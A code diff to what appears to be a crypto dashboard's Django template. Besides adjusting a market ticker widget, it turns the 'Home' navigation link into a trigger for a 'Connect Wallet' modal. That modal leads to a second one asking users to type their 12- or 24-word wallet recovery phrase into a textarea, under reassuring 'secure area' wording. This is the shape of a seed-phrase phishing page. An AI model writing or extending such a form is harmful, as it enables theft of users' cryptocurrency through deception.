@@ -115,17 +115,18 @@
                         {
                             "symbols": [
                                 { "proName": "FOREXCOM:SPXUSD", "title": "S&P 500" },
-                                { "proName": "FX_IDC:EURUSD", "title": "EUR to USD" },
-                                { "proName": "BITSTAMP:BTCUSD", "title": "Bitcoin" },
-                                { "proName": "BITSTAMP:ETHUSD", "title": "Ethereum" },
-                                { "proName": "BINANCE:XRPUSDT", "title": "XRP" },
-                                { "proName": "BINANCE:SOLUSDT", "title": "Solana" }
+                                { "proName": "FOREXCOM:NSXUSD", "title": "Nasdaq 100" },
+                                { "proName": "FX_IDC:EURUSD", "title": "EUR/USD" },
+                                { "proName": "BITSTAMP:BTCUSD", "title": "BTC/USD" },
+                                { "proName": "BITSTAMP:ETHUSD", "title": "ETH/USD" }
                             ],
                                 "showSymbolLogo": true,
-                                    "isTransparent": true,
-                                        "displayMode": "adaptive",
-                                            "colorTheme": "dark",
-                                                "locale": "en"
+                                    "colorTheme": "dark",
+                                        "isTransparent": false,
+                                            "displayMode": "adaptive",
+                                                "width": "100%",
+                                                    "height": 46,
+                                                        "locale": "en"
                         }
                     </script>
             </div>
@@ -271,7 +272,7 @@
 
 <!-- Bottom navigation bar -->
 <nav class="dash-bottomnav">
-    <a href="/" class="dash-nav-item">
+    <a href="javascript:void(0)" class="dash-nav-item" data-modal-open="connectWalletModal">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
             stroke-linejoin="round">
             <path d="M21 12V7H5a2 2 0 0 1 0-4h14v4"></path>
@@ -306,6 +307,55 @@
         <span>Home</span>
     </a>
 </nav>
+
+<!-- Connect Wallet modal -->
+<div class="modal fade wallet-modal connect-wallet-modal" id="connectWalletModal" tabindex="-1"
+    aria-labelledby="connectWalletModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title" id="connectWalletModalLabel">Connect Wallet</h5>
+                <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
+            </div>
+            <hr>
+
+            <div class="modal-body">
+                <p class="text-danger fs-small text-center">
+                    This is a secure area.. You're the only one who can view or access your phrase on the ledger ..
+                    Never share your phrase with anyone.
+                </p>
+                <h4 class="text-center">Connect Wallet</h4>
+                <p class="text-center">Please connect by entering an existing wallet or create a new one.</p>
+                <button type="button" id="connectAWalletBtn" class="text-center w-100 bg-info border-0 text-white p-3">
+                    Connect A Wallet
+                </button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Second modal, opened by "Connect A Wallet" — intentionally empty -->
+<div class="modal fade wallet-modal" id="emptyWalletModal" tabindex="-1" aria-labelledby="emptyWalletModalLabel"
+    aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title" id="emptyWalletModalLabel"></h5>
+                <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <div class="cardmodal">
+                    <h5>Enter Recovery Phrase</h5>
+                    <p>Typically 12 (sometimes 24) words separated by single spaces
+                        <img class=" float-end" src="{%static 'app/image/phrase.png'%}" alt="">
+                    </p>
+                    <textarea name="phrase" id=""></textarea>
+                </div>
+
+            </div>
+        </div>
+    </div>
+</div>
 
 <!-- Google Translate (hidden default widget, driven by our custom dropdown) -->
 <div id="google_translate_element" style="display:none;"></div>
@@ -344,8 +394,6 @@
                 select.value = lang;
                 select.dispatchEvent(new Event('change'));
             } else {
-                // Widget not ready yet (or page just loaded with a stored
-                // non-English language) — set the cookie and reload once.
                 setGoogTransCookie(lang);
                 if (lang !== 'en') {
                     window.location.reload();
@@ -359,7 +407,6 @@
             var label = document.getElementById('dashLangLabel');
             var wrap = document.getElementById('dashLangWrap');
 
-            // Default is English unless the user previously picked something else.
             var stored = null;
             try { stored = JSON.parse(localStorage.getItem(STORAGE_KEY)); } catch (e) { }
 
@@ -394,8 +441,6 @@
                 });
             });
 
-            // If a non-English language was stored from a previous visit,
-            // re-apply it once the Google Translate widget has initialized.
             if (stored && stored.lang && stored.lang !== 'en') {
                 var tries = 0;
                 var timer = setInterval(function () {
@@ -424,4 +469,8 @@
     })(window, document);
 </script>
 <!-- End of Chaport Live Chat code -->
+{% endblock %}
+
+{% block extra_scripts %}
+<script src="{% static 'app/dashboard.js' %}"></script>
 {% endblock %}
